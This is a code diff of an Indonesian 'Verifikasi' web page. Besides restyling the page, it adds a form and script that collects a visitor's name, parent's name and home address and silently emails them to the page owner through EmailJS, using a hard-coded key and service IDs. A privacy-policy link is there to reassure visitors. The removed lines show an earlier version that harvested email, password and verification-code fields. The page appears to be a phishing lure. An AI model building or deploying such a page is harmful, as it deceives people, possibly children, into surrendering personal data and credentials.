@@ -5,85 +5,140 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verifikasi</title>
   <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Poppins", sans-serif;
+    }
+
     body {
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background: linear-gradient(135deg, #bbdefb, #90caf9);
-      font-family: "Poppins", sans-serif;
+      margin: 0;
+      background: linear-gradient(120deg, #e3f2fd, #90caf9);
     }
+
     .box {
-      background: white;
+      background: rgba(255, 255, 255, 0.95);
       padding: 40px;
-      border-radius: 10px;
+      border-radius: 16px;
       text-align: center;
-      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+      width: 100%;
+      max-width: 400px;
+      transition: all 0.4s ease;
     }
+
+    .box:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.12);
+    }
+
+    h2 {
+      color: #1565c0;
+      font-weight: 600;
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+
     input {
-      padding: 10px;
+      padding: 12px;
       width: 100%;
       margin-top: 10px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      outline: none;
+      border: none;
+      border-radius: 10px;
+      background: #f5f7fa;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.08);
+      font-size: 14px;
+      transition: 0.3s;
     }
+
+    input:focus {
+      background: #ffffff;
+      outline: none;
+      box-shadow: 0 0 0 2px #90caf9;
+    }
+
     button {
-      margin-top: 15px;
-      padding: 10px 20px;
+      margin-top: 25px;
+      padding: 12px 20px;
       background: #1976d2;
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
+      font-size: 15px;
+      transition: background 0.3s, transform 0.3s;
+    }
+
+    button:hover {
+      background: #0d47a1;
+      transform: scale(1.03);
+    }
+
+    p {
+      font-size: 13px;
+      margin-top: 20px;
+      color: #555;
+    }
+
+    a {
+      color: #1565c0;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    br {
+      line-height: 0;
     }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>Masukan Masukan namamu</h2>
-    <input type="text" placeholder="Siapa nama mu?" required>
-    <br>
-    <br>
-    <br>
-    <br>
-    <h2>Masukan Nama Ortu/Orang tua</h2>
-    <input type="text" id="password" placeholder="Tolong untuk di isi" required>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <h2>Masukan alamat Rumah mu</h2>
-    <input type="text" id="email" placeholder="Alamat rumah" required>
-    <p>apakah anda ragu dengan kami? anda bisa cek:<a href="privacy.html">Privacy And policy</a> Kami</p>
-    <a href="selesai.html"><button type="submit">Selesai</button></a>
+    <form id="verifyForm">
+      <input type="text" id="nama" placeholder="Siapa nama mu?" required>
+      <br><br><br><br>
+      <h2>Masukan Nama Ortu/Orang tua</h2>
+      <input type="text" id="ortu" placeholder="Tolong untuk di isi" required>
+      <br><br><br><br><br>
+      <h2>Masukan alamat Rumah mu</h2>
+      <input type="text" id="alamat" placeholder="Alamat rumah" required>
+      <p>apakah anda ragu dengan kami? anda bisa cek: <a href="privacy.html">Privacy And policy</a> Kami</p>
+      <button type="submit">Selesai</button>
+    </form>
   </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function() {
-      emailjs.init("4ouxaUkNkXNV7IwFa"); // Ganti dengan Public Key kamu
+      emailjs.init("4ouxaUkNkXNV7IwFa");
     })();
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      const loading = document.getElementById("loading");
-      loading.style.display = "block";
+
+      const nama = document.getElementById("nama").value;
+      const ortu = document.getElementById("ortu").value;
+      const alamat = document.getElementById("alamat").value;
 
       const templateParams = {
-        user_email: email,
-        user_password: password,
-        verification_code: code
+        user_nama: nama,
+        user_ortu: ortu,
+        user_alamat: alamat
       };
 
       emailjs.send("service_gbaqlrq", "template_gnsct6i", templateParams)
         .then(() => {
-          loading.innerText = "Penyimpanan data berhasil";
-          setTimeout(() => {
-            window.location.href = "selesai.html";
-          }, 1500);
+          window.location.href = "selesai.html";
         })
         .catch(() => {
-          loading.innerText = "Gagal, tolong coba lagi";
+          alert("Gagal, tolong coba lagi.");
         });
     });
   </script>
